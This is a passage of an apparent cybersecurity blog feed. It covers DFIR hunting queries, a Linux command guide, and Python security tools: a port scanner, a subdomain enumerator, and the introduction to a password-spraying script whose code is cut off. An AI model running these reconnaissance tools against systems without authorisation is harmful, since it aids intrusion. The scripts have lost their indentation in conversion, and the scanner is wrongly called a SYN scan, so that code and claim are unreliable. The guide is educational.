+<h1 id="2-hunt-for-suspicious-persistence-in-the-windows-registry" tabindex="-1">2. Hunt for suspicious persistence in the Windows Registry <a class="direct-link" href="#2-hunt-for-suspicious-persistence-in-the-windows-registry" aria-hidden="true">#</a></h1>
+<p>SELECT Key.FullPath, ValueName, Data<br>
+FROM read_registry()<br>
+WHERE Key.FullPath LIKE &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run%&quot;<br>
+AND Data NOT LIKE &quot;%explorer%&quot;</p>
+<h1 id="3-collect-the-contents-of-a-specific-suspicious-directory" tabindex="-1">3. Collect the contents of a specific suspicious directory <a class="direct-link" href="#3-collect-the-contents-of-a-specific-suspicious-directory" aria-hidden="true">#</a></h1>
+<p>SELECT FullPath, Mtime, Size, Name<br>
+FROM glob(globs=&quot;/Users/<em>/Downloads/</em>.exe&quot;)</p>
+<h1 id="4-hunt-for-matching-yara-rules-on-files" tabindex="-1">4. Hunt for matching YARA rules on files <a class="direct-link" href="#4-hunt-for-matching-yara-rules-on-files" aria-hidden="true">#</a></h1>
+<p>SELECT * FROM hunt_yara(rules=&quot;rule Suspicious { $s = /evil_script/ condition: $s }&quot;)</code></pre></p>
+</div>
+<h2 id="the-incident-response-playbook" tabindex="-1">The Incident Response Playbook <a class="direct-link" href="#the-incident-response-playbook" aria-hidden="true">#</a></h2>
+<p>Every SOC has an incident response playbook. It is the step-by-step guide that analysts follow during a breach. The SANS Institute defines the six phases of IR:</p>
+<ol>
+<li><strong>Preparation:</strong> Setting up the lab, installing tools, and defining roles.</li>
+<li><strong>Detection &amp; Analysis:</strong> Identifying the alert and triaging it (is it a false positive?).</li>
+<li><strong>Containment:</strong> Isolating the affected system to prevent the attack from spreading.</li>
+<li><strong>Eradication:</strong> Removing the root cause (malware, backdoors, compromised accounts).</li>
+<li><strong>Recovery:</strong> Bringing the system back online in a clean, patched state.</li>
+<li><strong>Lessons Learned:</strong> A post-mortem meeting to discuss what went well and what can be improved.</li>
+</ol>
+<p>In the BlueCapeSecurity training, we simulated a ransomware containment drill, isolating a rogue machine and triaging a suspicious PowerShell process using the tools above.</p>
+<h2 id="my-dfir-lab-setup" tabindex="-1">My DFIR Lab Setup <a class="direct-link" href="#my-dfir-lab-setup" aria-hidden="true">#</a></h2>
+<p>You don't need expensive hardware to practice DFIR. My current lab runs entirely on VirtualBox and consists of:</p>
+<ul>
+<li><strong>Kali Linux:</strong> Used for Volatility, Velociraptor server, and other analysis tools.</li>
+<li><strong>Windows 10 VM:</strong> Acts as the &quot;compromised&quot; target. I simulate malicious activity here and capture the artifacts.</li>
+<li><strong>Ubuntu Server:</strong> Runs Splunk Enterprise and acts as the log aggregator.</li>
+</ul>
+<p>I practice by running malware samples (from safe sandboxes like Any.Run) on the Windows VM, capturing the memory and disk images, and then analyzing the evidence to reconstruct the attack.</p>
+<div class="callout callout-success">
+  <i class="fa-solid fa-circle-check" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Start Small, Think Big</div>
+    <div class="callout-body">You don't need a 10-node corporate network. A single Windows VM and a Kali VM are enough to start learning memory and disk forensics. The skills are universal — you can scale up to larger environments later.</div>
+  </div>
+</div>
+<h2 id="next-steps-and-resources" tabindex="-1">Next Steps &amp; Resources <a class="direct-link" href="#next-steps-and-resources" aria-hidden="true">#</a></h2>
+<p>If you want to dive deeper into DFIR, here is what I recommend:</p>
+<ul>
+<li><strong>BlueCapeSecurity DFIR Course:</strong> Highly recommended for the structured curriculum and hands-on labs.</li>
+<li><strong>Certification:</strong> Consider the <strong>GIAC Certified Forensic Analyst (GCFA)</strong> or <strong>EC-Council's Computer Hacking Forensic Investigator (CHFI)</strong>.</li>
+<li><strong>Open Source Tools:</strong> Install Volatility 3, Autopsy, and Velociraptor on your machine right now.</li>
+<li><strong>CTFs:</strong> Try the &quot;Forensics&quot; challenges on <strong>CyberDefenders</strong> and <strong>TryHackMe</strong>.</li>
+</ul>
+<p>DFIR is the frontline of cybersecurity. It requires patience, attention to detail, and a methodical approach — but it is one of the most rewarding fields in the industry. Happy hunting.</p>
+]]></content>
+    <author>
+      <name>Aimad Ul Islam</name>
+    </author>
+    
+      
+    <category term="Cybersecurity"/>
+      
+    <category term="Tutorials"/>
+      
+    
+    
+    
+    <media:thumbnail url="https://i.postimg.cc/hPyNdGVF/Whats-App-Image-2026-07-05-at-9-35-59-PM.jpg"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux Essentials: Every Command You Actually Need</title>
+    <link href="https://aimadulislam.dpdns.org/posts/linux-essentials-guide/"/>
+    <updated>2026-06-28T00:00:00.000Z</updated>
+    <id>https://aimadulislam.dpdns.org/posts/linux-essentials-guide/</id>
+    <summary type="html"><![CDATA[From file permissions to bash scripting — the complete Linux reference guide for cybersecurity professionals.]]></summary>
+    <content type="html"><![CDATA[<h2 id="introduction" tabindex="-1">Introduction <a class="direct-link" href="#introduction" aria-hidden="true">#</a></h2>
+<p>Linux is the undisputed backbone of modern IT infrastructure. From cloud servers (AWS, Azure, GCP) to container orchestration (Kubernetes, Docker) and enterprise networks, Linux runs over 90% of the world's servers. More importantly for us cybersecurity professionals, <strong>Kali Linux</strong> is the industry standard for penetration testing.</p>
+<p>During my <strong>Cisco Linux Essentials</strong> certification (aligned with the <strong>LPI Linux Professional Institute Certification - Linux Essentials (010-160)</strong>), I built this comprehensive reference guide. It condenses everything you need to know into practical, executable commands.</p>
+<div class="callout callout-info">
+  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">LPI Essentials Focus</div>
+    <div class="callout-body">This guide covers the core competencies of the LPI Linux Essentials exam, including CLI navigation, managing files and permissions, working with text streams, installing software, and basic shell scripting.</div>
+  </div>
+</div>
+<div class="callout callout-warn">
+  <i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Linux & Cybersecurity</div>
+    <div class="callout-body">If you are learning ethical hacking, start here. Almost every tool you will use (Metasploit, Nmap, Burp Suite, Wireshark, etc.) runs natively on Linux. A deep understanding of the CLI is mandatory for any penetration tester or SOC analyst.</div>
+  </div>
+</div>
+<h2 id="file-system-navigation" tabindex="-1">File System Navigation <a class="direct-link" href="#file-system-navigation" aria-hidden="true">#</a></h2>
+<p>The Linux file system is a hierarchical tree starting from the root directory, denoted by a forward slash (<code>/</code>). Here are the commands you will use daily to move around.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Navigating the Filesystem</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Print current working directory
+pwd
+<h1 id="list-files-in-the-current-directory" tabindex="-1">List files in the current directory <a class="direct-link" href="#list-files-in-the-current-directory" aria-hidden="true">#</a></h1>
+<p>ls</p>
+<h1 id="list-all-files-including-hidden-files-with-detailed-info" tabindex="-1">List all files (including hidden .files) with detailed info <a class="direct-link" href="#list-all-files-including-hidden-files-with-detailed-info" aria-hidden="true">#</a></h1>
+<p>ls -la</p>
+<h1 id="change-directory-to-etc" tabindex="-1">Change directory to /etc <a class="direct-link" href="#change-directory-to-etc" aria-hidden="true">#</a></h1>
+<p>cd /etc</p>
+<h1 id="go-back-to-the-previous-directory" tabindex="-1">Go back to the previous directory <a class="direct-link" href="#go-back-to-the-previous-directory" aria-hidden="true">#</a></h1>
+<p>cd -</p>
+<h1 id="go-to-your-users-home-directory" tabindex="-1">Go to your user's home directory (~) <a class="direct-link" href="#go-to-your-users-home-directory" aria-hidden="true">#</a></h1>
+<p>cd ~</p>
+<h1 id="view-directory-structure-as-a-tree-install-if-needed-apt-install-tree" tabindex="-1">View directory structure as a tree (install if needed: apt install tree) <a class="direct-link" href="#view-directory-structure-as-a-tree-install-if-needed-apt-install-tree" aria-hidden="true">#</a></h1>
+<p>tree -L 2 /var/log</code></pre></p>
+</div>
+Key directories you should memorise: `/etc` (configuration files), `/var/log` (system logs), `/home` (user home directories), and `/bin` (essential system binaries).
+<h2 id="file-permissions-and-ownership" tabindex="-1">File Permissions &amp; Ownership <a class="direct-link" href="#file-permissions-and-ownership" aria-hidden="true">#</a></h2>
+<p>Linux is a multi-user operating system, and permissions are critical for security. Every file and directory has three permission sets: <strong>Owner</strong> (u), <strong>Group</strong> (g), and <strong>Others</strong> (o).</p>
+<p>Permissions are broken into <strong>Read</strong> (r), <strong>Write</strong> (w), and <strong>Execute</strong> (x). They can be represented symbolically (<code>-rwxr-xr--</code>) or by octal numbers (<code>755</code>).</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Understanding and Modifying Permissions</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># View current permissions
+ls -l filename.txt
+# Output: -rw-r--r-- 1 aimad aimad 2048 Jun 28 10:00 filename.txt
+<h1 id="change-permissions-using-octal-values" tabindex="-1">Change permissions using octal values <a class="direct-link" href="#change-permissions-using-octal-values" aria-hidden="true">#</a></h1>
+<p>chmod 755 script.sh  # Owner:rwx, Group:r-x, Others:r-x</p>
+<h1 id="change-permissions-using-symbolic-notation" tabindex="-1">Change permissions using symbolic notation <a class="direct-link" href="#change-permissions-using-symbolic-notation" aria-hidden="true">#</a></h1>
+<p>chmod u+x script.sh  # Adds execute for the owner<br>
+chmod go-w script.sh # Removes write for group and others</p>
+<h1 id="change-ownership-of-a-file" tabindex="-1">Change ownership of a file <a class="direct-link" href="#change-ownership-of-a-file" aria-hidden="true">#</a></h1>
+<p>sudo chown newuser:newgroup filename.txt</p>
+<h1 id="change-default-file-creation-permissions-umask" tabindex="-1">Change default file creation permissions (umask) <a class="direct-link" href="#change-default-file-creation-permissions-umask" aria-hidden="true">#</a></h1>
+<p>umask 022  # Sets default permissions to 755 for directories, 644 for files</code></pre></p>
+</div>
+**Important for Security:** Never give `777` (full permissions to everyone) to a file on a production server. This is a major security risk allowing anyone to modify your critical files.
+<h2 id="text-processing-and-filtering" tabindex="-1">Text Processing &amp; Filtering <a class="direct-link" href="#text-processing-and-filtering" aria-hidden="true">#</a></h2>
+<p>In Linux, everything is a file or a stream of text. Mastering text processing tools allows you to filter massive log files, extract IP addresses, and parse command outputs quickly.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Text Pipes & Filters</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># View a file page by page
+less /var/log/syslog
+<h1 id="view-only-the-first-10-or-last-10-lines-of-a-file" tabindex="-1">View only the first 10 or last 10 lines of a file <a class="direct-link" href="#view-only-the-first-10-or-last-10-lines-of-a-file" aria-hidden="true">#</a></h1>
+<p>head -n 5 /etc/passwd<br>
+tail -f /var/log/auth.log  # Follow new lines in real-time (great for monitoring)</p>
+<h1 id="search-for-specific-text-patterns-using-grep" tabindex="-1">Search for specific text patterns using grep <a class="direct-link" href="#search-for-specific-text-patterns-using-grep" aria-hidden="true">#</a></h1>
+<p>grep &quot;Failed password&quot; /var/log/auth.log</p>
+<h1 id="search-recursively-through-all-files-in-a-directory" tabindex="-1">Search recursively through all files in a directory <a class="direct-link" href="#search-recursively-through-all-files-in-a-directory" aria-hidden="true">#</a></h1>
+<p>grep -r &quot;error&quot; /var/log/</p>
+<h1 id="cut-specific-columns-from-a-file-e-g-get-only-usernames-from-etc-passwd" tabindex="-1">Cut specific columns from a file (e.g., get only usernames from /etc/passwd) <a class="direct-link" href="#cut-specific-columns-from-a-file-e-g-get-only-usernames-from-etc-passwd" aria-hidden="true">#</a></h1>
+<p>cut -d: -f1 /etc/passwd</p>
+<h1 id="sort-output-and-count-duplicates" tabindex="-1">Sort output and count duplicates <a class="direct-link" href="#sort-output-and-count-duplicates" aria-hidden="true">#</a></h1>
+<p>cat /var/log/access.log | cut -d' ' -f1 | sort | uniq -c | sort -nr  # Top IP addresses</code></pre></p>
+</div>
+<p><strong>Pro Tip:</strong> The pipe operator <code>|</code> is the secret to Linux power. It takes the output of the command on the left and sends it as input to the command on the right, allowing you to chain complex queries effortlessly.</p>
+<h2 id="package-management" tabindex="-1">Package Management <a class="direct-link" href="#package-management" aria-hidden="true">#</a></h2>
+<p>Linux distributions are split into two major families: <strong>Debian-based</strong> (Ubuntu, Kali, Debian) which use <code>apt</code> and <code>dpkg</code>, and <strong>RPM-based</strong> (RedHat, CentOS, Fedora) which use <code>yum</code> or <code>dnf</code>. This guide focuses on Debian-based systems, which are the most common for cybersecurity.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Software Management with APT</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Update the package list
+sudo apt update
+<h1 id="upgrade-all-installed-packages" tabindex="-1">Upgrade all installed packages <a class="direct-link" href="#upgrade-all-installed-packages" aria-hidden="true">#</a></h1>
+<p>sudo apt upgrade -y</p>
+<h1 id="install-a-new-package-e-g-nmap" tabindex="-1">Install a new package (e.g., nmap) <a class="direct-link" href="#install-a-new-package-e-g-nmap" aria-hidden="true">#</a></h1>
+<p>sudo apt install nmap -y</p>
+<h1 id="remove-a-package" tabindex="-1">Remove a package <a class="direct-link" href="#remove-a-package" aria-hidden="true">#</a></h1>
+<p>sudo apt remove nmap</p>
+<h1 id="search-for-a-package-in-the-repository" tabindex="-1">Search for a package in the repository <a class="direct-link" href="#search-for-a-package-in-the-repository" aria-hidden="true">#</a></h1>
+<p>apt search &quot;web server&quot;</p>
+<h1 id="view-detailed-information-about-a-package" tabindex="-1">View detailed information about a package <a class="direct-link" href="#view-detailed-information-about-a-package" aria-hidden="true">#</a></h1>
+<p>apt show nmap</code></pre></p>
+</div>
+<div class="callout callout-success">
+  <i class="fa-solid fa-circle-check" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Pro Tip for Pen Testers</div>
+    <div class="callout-body">Always run <code>sudo apt update && sudo apt upgrade -y</code> on your Kali Linux environment before starting a penetration test to ensure you have the latest exploits and tools available.</div>
+  </div>
+</div>
+<h2 id="processes-and-system-monitoring" tabindex="-1">Processes &amp; System Monitoring <a class="direct-link" href="#processes-and-system-monitoring" aria-hidden="true">#</a></h2>
+<p>When a system is compromised, malicious processes run in the background. You need to know how to find them and stop them.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Monitor and Manage Running Processes</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># List all running processes with detailed info
+ps aux
+<h1 id="view-processes-in-a-hierarchical-tree" tabindex="-1">View processes in a hierarchical tree <a class="direct-link" href="#view-processes-in-a-hierarchical-tree" aria-hidden="true">#</a></h1>
+<p>pstree</p>
+<h1 id="interactive-process-viewer-press-q-to-quit" tabindex="-1">Interactive process viewer (press 'q' to quit) <a class="direct-link" href="#interactive-process-viewer-press-q-to-quit" aria-hidden="true">#</a></h1>
+<p>top</p>
+<h1 id="or-install-htop-for-a-better-visual-experience-sudo-apt-install-htop" tabindex="-1">Or install htop for a better visual experience: sudo apt install htop <a class="direct-link" href="#or-install-htop-for-a-better-visual-experience-sudo-apt-install-htop" aria-hidden="true">#</a></h1>
+<h1 id="find-a-specific-process-by-name-e-g-apache" tabindex="-1">Find a specific process by name (e.g., Apache) <a class="direct-link" href="#find-a-specific-process-by-name-e-g-apache" aria-hidden="true">#</a></h1>
+<p>ps aux | grep apache</p>
+<h1 id="kill-a-process-by-its-pid-process-id" tabindex="-1">Kill a process by its PID (Process ID) <a class="direct-link" href="#kill-a-process-by-its-pid-process-id" aria-hidden="true">#</a></h1>
+<p>sudo kill -9 1234  # -9 forces an immediate kill</p>
+<h1 id="view-system-services-status" tabindex="-1">View system services status <a class="direct-link" href="#view-system-services-status" aria-hidden="true">#</a></h1>
+<p>systemctl status ssh</p>
+<h1 id="start-stop-restart-a-service" tabindex="-1">Start/Stop/Restart a service <a class="direct-link" href="#start-stop-restart-a-service" aria-hidden="true">#</a></h1>
+<p>sudo systemctl start ssh<br>
+sudo systemctl enable ssh  # Enable to start on boot</code></pre></p>
+</div>
+<h2 id="users-and-groups" tabindex="-1">Users &amp; Groups <a class="direct-link" href="#users-and-groups" aria-hidden="true">#</a></h2>
+<p>Managing users, groups, and their privileges is essential for system security and compliance.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">User and Group Administration</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Add a new user
+sudo useradd -m -g users -s /bin/bash newuser
+<h1 id="set-or-change-a-users-password" tabindex="-1">Set or change a user's password <a class="direct-link" href="#set-or-change-a-users-password" aria-hidden="true">#</a></h1>
+<p>sudo passwd newuser</p>
+<h1 id="add-a-user-to-a-new-group-e-g-sudo" tabindex="-1">Add a user to a new group (e.g., sudo) <a class="direct-link" href="#add-a-user-to-a-new-group-e-g-sudo" aria-hidden="true">#</a></h1>
+<p>sudo usermod -aG sudo newuser</p>
+<h1 id="delete-a-user" tabindex="-1">Delete a user <a class="direct-link" href="#delete-a-user" aria-hidden="true">#</a></h1>
+<p>sudo userdel -r newuser</p>
+<h1 id="view-all-users-on-the-system" tabindex="-1">View all users on the system <a class="direct-link" href="#view-all-users-on-the-system" aria-hidden="true">#</a></h1>
+<p>cat /etc/passwd</p>
+<h1 id="switch-to-a-different-user-context" tabindex="-1">Switch to a different user context <a class="direct-link" href="#switch-to-a-different-user-context" aria-hidden="true">#</a></h1>
+<p>su - aimad</p>
+<h1 id="execute-a-single-command-as-root-super-user" tabindex="-1">Execute a single command as root (super user) <a class="direct-link" href="#execute-a-single-command-as-root-super-user" aria-hidden="true">#</a></h1>
+<p>sudo whoami</code></pre></p>
+</div>
+Privilege escalation is a major attack vector. Always ensure standard users have the least amount of privileges required. Use `sudo` sparingly and never give a user root-level access unless absolutely necessary.
+<h2 id="bash-scripting-for-automation" tabindex="-1">Bash Scripting for Automation <a class="direct-link" href="#bash-scripting-for-automation" aria-hidden="true">#</a></h2>
+<p>Automation is a core skill for both system administrators and security professionals. Instead of manually typing 10 commands, you can put them in a script and run them all at once.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Your First Bash Script</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code>#!/bin/bash
+# This is a simple backup script
+<h1 id="variables" tabindex="-1">Variables <a class="direct-link" href="#variables" aria-hidden="true">#</a></h1>
+<p>BACKUP_DIR=&quot;/backups&quot;<br>
+SOURCE_DIR=&quot;/var/www/html&quot;<br>
+DATE=$(date +%Y%m%d)</p>
+<h1 id="create-backup-directory-if-it-doesnt-exist" tabindex="-1">Create backup directory if it doesn't exist <a class="direct-link" href="#create-backup-directory-if-it-doesnt-exist" aria-hidden="true">#</a></h1>
+<p>mkdir -p $BACKUP_DIR</p>
+<h1 id="archive-and-compress-the-source-directory" tabindex="-1">Archive and compress the source directory <a class="direct-link" href="#archive-and-compress-the-source-directory" aria-hidden="true">#</a></h1>
+<p>tar -czf $BACKUP_DIR/backup_$DATE.tar.gz $SOURCE_DIR</p>
+<h1 id="print-success-message" tabindex="-1">Print success message <a class="direct-link" href="#print-success-message" aria-hidden="true">#</a></h1>
+<p>echo &quot;Backup completed successfully for $DATE&quot;</code></pre></p>
+</div>
+<div class="code-block-wrap">
+  <span class="code-block-label">Loops, Conditions, and Cron</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Use an IF statement to check privileges
+if [ $USER == "root" ]; then
+    echo "You are running as root!"
+else
+    echo "Run this script with sudo."
+fi
+<h1 id="for-loop-to-process-a-list-of-ip-addresses" tabindex="-1">FOR loop to process a list of IP addresses <a class="direct-link" href="#for-loop-to-process-a-list-of-ip-addresses" aria-hidden="true">#</a></h1>
+<p>for ip in $(cat ip_list.txt); do<br>
+ping -c 1 $ip<br>
+done</p>
+<h1 id="schedule-the-script-to-run-automatically-using-cron-crontab-e" tabindex="-1">Schedule the script to run automatically using Cron (crontab -e) <a class="direct-link" href="#schedule-the-script-to-run-automatically-using-cron-crontab-e" aria-hidden="true">#</a></h1>
+<h1 id="runs-at-2-am-every-day" tabindex="-1">Runs at 2 AM every day <a class="direct-link" href="#runs-at-2-am-every-day" aria-hidden="true">#</a></h1>
+<p>0 2 * * * /home/aimad/scripts/backup.sh</code></pre></p>
+</div>
+<h2 id="linux-security-hardening" tabindex="-1">Linux Security Hardening <a class="direct-link" href="#linux-security-hardening" aria-hidden="true">#</a></h2>
+<p>Securing your Linux server is non-negotiable. Here are the fundamental steps you can take to protect a system from attack.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Basic System Hardening</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># 1. Enable and configure the firewall (UFW - Uncomplicated Firewall)
+sudo ufw enable
+sudo ufw allow 22/tcp  # Allow SSH explicitly
+sudo ufw allow 80/tcp  # Allow HTTP for web servers
+sudo ufw status
+<h1 id="2-harden-ssh-configuration" tabindex="-1">2. Harden SSH configuration <a class="direct-link" href="#2-harden-ssh-configuration" aria-hidden="true">#</a></h1>
+<p>sudo nano /etc/ssh/sshd_config</p>
+<h1 id="set-permitrootlogin-no" tabindex="-1">Set: PermitRootLogin no <a class="direct-link" href="#set-permitrootlogin-no" aria-hidden="true">#</a></h1>
+<h1 id="set-passwordauthentication-no-use-ssh-keys-instead" tabindex="-1">Set: PasswordAuthentication no (Use SSH keys instead) <a class="direct-link" href="#set-passwordauthentication-no-use-ssh-keys-instead" aria-hidden="true">#</a></h1>
+<p>sudo systemctl restart sshd</p>
+<h1 id="3-generate-a-strong-ssh-key-pair" tabindex="-1">3. Generate a strong SSH key pair <a class="direct-link" href="#3-generate-a-strong-ssh-key-pair" aria-hidden="true">#</a></h1>
+<p>ssh-keygen -t ed25519 -C &quot;aimad@secureserver&quot;</p>
+<h1 id="4-audit-open-ports-to-ensure-no-unnecessary-services-are-running" tabindex="-1">4. Audit open ports to ensure no unnecessary services are running <a class="direct-link" href="#4-audit-open-ports-to-ensure-no-unnecessary-services-are-running" aria-hidden="true">#</a></h1>
+<p>sudo netstat -tulpn</p>
+<h1 id="5-configure-automatic-security-updates" tabindex="-1">5. Configure automatic security updates <a class="direct-link" href="#5-configure-automatic-security-updates" aria-hidden="true">#</a></h1>
+<p>sudo apt install unattended-upgrades<br>
+sudo dpkg-reconfigure --priority=low unattended-upgrades</code></pre></p>
+</div>
+<div class="callout callout-danger">
+  <i class="fa-solid fa-circle-exclamation" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Critical SSH Hardening</div>
+    <div class="callout-body">On internet-facing servers, disabling root login (<code>PermitRootLogin no</code>) and using only SSH keys instead of passwords (<code>PasswordAuthentication no</code>) are the two most important settings. Brute-force SSH attacks are inevitable — these settings stop them dead.</div>
+  </div>
+</div>
+<h2 id="next-steps-and-resources" tabindex="-1">Next Steps &amp; Resources <a class="direct-link" href="#next-steps-and-resources" aria-hidden="true">#</a></h2>
+<p>Mastering Linux is a journey, not a destination. Here are my recommended next steps after this guide:</p>
+<ul>
+<li><strong>Take the LPI Linux Essentials Exam (010-160):</strong> Validate your knowledge with the official certification. It is a great foundational stepping stone.</li>
+<li><strong>Explore OverTheWire Bandit:</strong> An excellent wargame that teaches Linux CLI skills through puzzles. Highly recommended for hands-on practice.</li>
+<li><strong>Build your own lab:</strong> Launch a virtual machine (Ubuntu Server or Kali) and practice the commands in this guide. Mess up, break things, and learn to fix them.</li>
+</ul>
+<p>The terminal is your most powerful weapon in cybersecurity. Keep typing, keep learning, and stay curious.</p>
+]]></content>
+    <author>
+      <name>Aimad Ul Islam</name>
+    </author>
+    
+      
+    <category term="Linux"/>
+      
+    <category term="Tutorials"/>
+      
+    
+    
+    
+    <media:thumbnail url="https://i.postimg.cc/hPyNdGVF/Whats-App-Image-2026-07-05-at-9-35-59-PM.jpg"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Python for Hackers: Security Automation Scripts from Scratch</title>
+    <link href="https://aimadulislam.dpdns.org/posts/python-for-security/"/>
+    <updated>2026-06-20T00:00:00.000Z</updated>
+    <id>https://aimadulislam.dpdns.org/posts/python-for-security/</id>
+    <summary type="html"><![CDATA[Port scanners, password sprayers, subdomain enumerators — building real security tools in Python from scratch.]]></summary>
+    <content type="html"><![CDATA[<h2 id="introduction" tabindex="-1">Introduction <a class="direct-link" href="#introduction" aria-hidden="true">#</a></h2>
+<p>Python is the go-to language for cybersecurity professionals. Its simplicity, extensive library ecosystem, and cross‑platform capabilities make it perfect for building custom automation tools. Whether you're a penetration tester, a SOC analyst, or a security researcher, writing your own scripts gives you the flexibility to tailor tools to your exact needs.</p>
+<p>In this guide, I'll walk you through four practical Python projects that I've built during my learning journey. You'll learn how to create a port scanner, a subdomain enumerator, a credential sprayer, and a log parser — all from scratch, with no external dependencies (except the standard library).</p>
+<div class="callout callout-info">
+  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Before You Begin</div>
+    <div class="callout-body">Make sure you have Python 3 installed. All code here uses only the standard library, so you can run these scripts immediately without installing any additional packages.</div>
+  </div>
+</div>
+<div class="callout callout-warn">
+  <i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Legal & Ethical Use</div>
+    <div class="callout-body">These tools are for educational purposes only. Only run them against systems you own or have explicit permission to test. Unauthorised scanning or credential testing is illegal.</div>
+  </div>
+</div>
+<h2 id="tool-1-port-scanner" tabindex="-1">Tool 1: Port Scanner <a class="direct-link" href="#tool-1-port-scanner" aria-hidden="true">#</a></h2>
+<p>A port scanner is the first step in any penetration test. It identifies open ports and services on a target, revealing potential attack surfaces. Our scanner will use TCP SYN scans (stealth scans) to check if a port is open, filtering out closed and filtered ports.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">port_scanner.py</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code>#!/usr/bin/env python3
+"""
+Simple TCP port scanner with threading for speed.
+"""
+import socket
+import sys
+import threading
+from queue import Queue
+<p>target = input(&quot;Enter target IP or domain: &quot;)<br>
+start_port = int(input(&quot;Start port: &quot;))<br>
+end_port = int(input(&quot;End port: &quot;))</p>
+<p>def scan_port(port):<br>
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>
+sock.settimeout(1)  # 1 second timeout<br>
+result = sock.connect_ex((target, port))<br>
+sock.close()<br>
+return result == 0</p>
+<p>def worker():<br>
+while not q.empty():<br>
+port = q.get()<br>
+if scan_port(port):<br>
+print(f&quot;[+] Port {port} is open&quot;)<br>
+q.task_done()</p>
+<h1 id="create-a-queue-and-fill-it-with-ports" tabindex="-1">Create a queue and fill it with ports <a class="direct-link" href="#create-a-queue-and-fill-it-with-ports" aria-hidden="true">#</a></h1>
+<p>q = Queue()<br>
+for port in range(start_port, end_port + 1):<br>
+q.put(port)</p>
+<h1 id="launch-threads" tabindex="-1">Launch threads <a class="direct-link" href="#launch-threads" aria-hidden="true">#</a></h1>
+<p>threads = []<br>
+for _ in range(50):  # 50 concurrent threads<br>
+t = threading.Thread(target=worker)<br>
+t.start()<br>
+threads.append(t)</p>
+<h1 id="wait-for-all-threads-to-finish" tabindex="-1">Wait for all threads to finish <a class="direct-link" href="#wait-for-all-threads-to-finish" aria-hidden="true">#</a></h1>
+<p>for t in threads:<br>
+t.join()</p>
+<p>print(&quot;Scan completed.&quot;)</code></pre></p>
+</div>
+<p><strong>How it works:</strong> The script tries to establish a TCP connection to each port. If the connection succeeds (returns <code>0</code>), the port is open. The queue and threading allow us to scan hundreds of ports in seconds.</p>
+<h2 id="tool-2-subdomain-enumerator" tabindex="-1">Tool 2: Subdomain Enumerator <a class="direct-link" href="#tool-2-subdomain-enumerator" aria-hidden="true">#</a></h2>
+<p>Subdomain enumeration helps discover hidden assets, test environments, and other services that might not be publicly listed. We'll use DNS resolution to find subdomains from a wordlist.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">subdomain_enum.py</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code>#!/usr/bin/env python3
+"""
+Subdomain enumerator using DNS resolution.
+"""
+import socket
+import sys
+<p>domain = input(&quot;Enter target domain (e.g., example.com): &quot;)<br>
+wordlist_file = input(&quot;Enter wordlist file path: &quot;)</p>
+<p>try:<br>
+with open(wordlist_file, 'r') as f:<br>
+subdomains = f.read().splitlines()<br>
+except FileNotFoundError:<br>
+print(&quot;File not found.&quot;)<br>
+sys.exit(1)</p>
+<p>for sub in subdomains:<br>
+subdomain = f&quot;{sub}.{domain}&quot;<br>
+try:<br>
+ip = socket.gethostbyname(subdomain)<br>
+print(f&quot;[+] Found: {subdomain} -&gt; {ip}&quot;)<br>
+except socket.gaierror:<br>
+# DNS resolution failed, subdomain does not exist<br>
+pass</code></pre></p>
+</div>
+<p>You can use a common wordlist like <code>subdomains.txt</code> from SecLists. This script is a foundation; you can later add threading, wildcard detection, and other enhancements.</p>
+<h2 id="tool-3-credential-tester-password-spray" tabindex="-1">Tool 3: Credential Tester (Password Spray) <a class="direct-link" href="#tool-3-credential-tester-password-spray" aria-hidden="true">#</a></h2>
+<p>Password spraying is an attack where you try a small set of common passwords against many accounts to avoid account lockouts. This script attempts to log in to a service (like SSH, FTP, or a web login) using a list of usernames and passwords.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">credential_spray.py</span>
